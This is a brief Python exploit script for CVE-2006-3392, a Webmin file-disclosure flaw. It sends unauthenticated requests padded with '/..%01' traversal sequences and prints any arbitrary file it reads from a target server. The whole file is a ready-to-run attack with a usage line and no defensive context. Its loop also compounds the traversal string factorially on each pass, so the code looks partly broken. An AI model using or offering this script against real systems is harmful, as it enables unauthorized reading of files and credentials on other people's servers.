#CVE-2006-3392
#Webmin < 1.290 & Webmin < 1.220

import requests, sys

def usage():
        print("Usage: python3 exploit.py <IP>:<PORT> <FILE>")

if len(sys.argv) > 1:
        charEsc = "/..%01"
        for qty in range(1,90):
                charEsc = charEsc * qty
                response = requests.get("http://{}/unauthenticated{}{}".format(sys.argv[1], charEsc,sys.argv[2]))
                if response.status_code == 200:
                        print("[+]URL =====> http://{}/unauthenticated{}{}\n\n".format(sys.argv[1], charEsc,sys.argv[2]), response.text)
                        break
else:
        usage()
